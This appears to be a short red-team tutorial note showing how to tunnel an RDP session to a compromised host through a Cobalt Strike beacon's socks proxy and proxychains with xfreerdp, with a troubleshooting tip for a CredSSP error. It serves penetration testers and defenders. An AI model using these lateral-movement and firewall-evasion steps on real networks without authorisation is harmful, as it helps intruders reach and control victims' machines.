---
description: 'Lateral Movement, Tunnelling, Firewall Evasion'
---

# From Beacon to Interactive RDP Session

This is a quick note showing how to get an interactive Remote Desktop Session \(RDP\) session from a Cobalt Strike beacon by leveraging socks proxy and proxychains.

## Socks Proxy

Say we have compromised a box and we have a beacon running on it:

![](../../.gitbook/assets/image%20%2818%29.png)

The same compromised machine is listening on 3389, meaning it accepts incoming RDP connections:

![](../../.gitbook/assets/image%20%28192%29.png)

Most often you will not be able to reach the machine via RDP from the outside due to corporate and host firewalls, however not all is lost - the machine is still reachable over RDP via sock proxy capability that the beacon provides.

Using the beacon we control, let's create a socks proxy on port 7777. This will expose a TCP port 7777 on the teamserver:

```text
socks 7777
```

![](../../.gitbook/assets/image%20%2834%29.png)

## Proxychains

With the socks proxy create, we can now jump onto any linux box \(Kali in my case\) and configure proxychains to point it to the teamserver and the port we've just exposed:

![](../../.gitbook/assets/image%20%2845%29.png)

We can now connect to the compromised box via RDP using xfreerdp:

{% code title="attacker@kali" %}
```text
proxychains xfreerdp /v:127.0.0.1:3389 /u:spotless
```
{% endcode %}

Below illustrates a successful RDP connection was established although the user on the other end \(me\) killed the session:

![](../../.gitbook/assets/image%20%28288%29.png)

{% hint style="warning" %}
**If you are getting...**  
`Error: CredSSP initialize failed, do you have correct kerberos ticket initialized?  
Failed to connect, CredSSP required by server`

Suggestion is to use `xfreerdp` instead of `rdesktop` and the issue will go away.
{% endhint %}

![CredSSP error using rdesktop](../../.gitbook/assets/image%20%28113%29.png)

